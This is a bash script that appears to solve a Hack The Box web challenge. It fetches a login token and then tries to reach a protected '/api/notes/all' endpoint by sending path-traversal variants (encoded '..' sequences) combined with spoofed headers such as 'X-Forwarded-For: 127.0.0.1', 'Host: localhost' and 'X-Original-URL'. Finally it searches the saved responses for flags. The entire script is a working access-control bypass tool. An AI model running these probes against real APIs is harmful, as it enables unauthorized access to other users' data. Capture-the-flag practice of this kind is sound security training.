#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
API_PORT=${2:-41412}
TO=${3:-8}
OUT_DIR=${4:-/workspace/recon/httpx}
mkdir -p "$OUT_DIR/bypass"
API_BASE="http://$IP:$API_PORT"
# 1) Fresh token
curl -fsS -m 8 --connect-timeout 8 -H 'Content-Type: application/json' \
  -d '{"email":"a@a.com","password":"a"}' \
  "$API_BASE/api/auth/login" > "$OUT_DIR/login_resp.json"
TOKEN=$(jq -r .token "$OUT_DIR/login_resp.json")
# 2) Define variants
mapfile -t PATHS < <(printf '%s\n' \
  '/api/notes/all' \
  '/api/notes?all=1' \
  '/api/notes/all/' \
  '/api/%2e%2e/api/notes/all' \
  '/api/..%2fapi/notes/all' \
  '/api/notes/%2e%2e/all' \
  '/api/notes/%2E%2E/all' \
  '/api/notes/%2e%2e%2f%2e%2e/notes/all' \
  '/api/.%2e/notes/all' \
  '/%2e%2e/api/notes/all')
mapfile -t HEADER_SETS < <(printf '%s\n' \
  '' \
  'X-Forwarded-For: 127.0.0.1' \
  'X-Real-IP: 127.0.0.1' \
  'Host: localhost' \
  'Host: 127.0.0.1' \
  'Forwarded: for=127.0.0.1;host=localhost;proto=http' \
  'X-Forwarded-For: ::1' \
  'X-Original-URL: /api/notes/all' \
  'X-Rewrite-URL: /api/notes/all' \
  'X-Forwarded-Host: localhost')
# 3) Helper to run a single request
run_req() {
  local url="$1"; shift
  local name="$1"; shift
  local outp="$OUT_DIR/bypass/${name}"
  curl -fsS -m "$TO" --connect-timeout "$TO" --path-as-is -i \
    -H "Authorization: Bearer $TOKEN" "$@" "$url" \
    > "${outp}.head" 2>/dev/null || true
}
# 4) Plain host
for p in "${PATHS[@]}"; do
  name="plain_$(echo "$p"|tr -cd 'A-Za-z0-9')"
  run_req "$API_BASE$p" "$name"
  for h in "${HEADER_SETS[@]}"; do
    [[ -z "$h" ]] && continue
    name="plainH_$(echo "$p"|tr -cd 'A-Za-z0-9')_$(echo "$h"|tr -cd 'A-Za-z0-9')"
    run_req "$API_BASE$p" "$name" -H "$h"
  done
done
# 5) With --resolve localhost:$API_PORT -> IP
for p in "${PATHS[@]}"; do
  name="resLocal_$(echo "$p"|tr -cd 'A-Za-z0-9')"
  curl -fsS -m "$TO" --connect-timeout "$TO" --path-as-is --resolve "localhost:$API_PORT:$IP" \
    -i -H "Authorization: Bearer $TOKEN" "http://localhost:$API_PORT$p" > "$OUT_DIR/bypass/${name}.head" 2>/dev/null || true
  # headers combos
  for h in "${HEADER_SETS[@]}"; do
    [[ -z "$h" ]] && continue
    name="resLocalH_$(echo "$p"|tr -cd 'A-Za-z0-9')_$(echo "$h"|tr -cd 'A-Za-z0-9')"
    curl -fsS -m "$TO" --connect-timeout "$TO" --path-as-is --resolve "localhost:$API_PORT:$IP" \
      -i -H "Authorization: Bearer $TOKEN" -H "$h" "http://localhost:$API_PORT$p" > "$OUT_DIR/bypass/${name}.head" 2>/dev/null || true
  done
done
# 6) Search for HTB flags
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR/bypass" > "$OUT_DIR/bypass_hits.txt" || true
sed -n '1,120p' "$OUT_DIR/bypass_hits.txt" || true
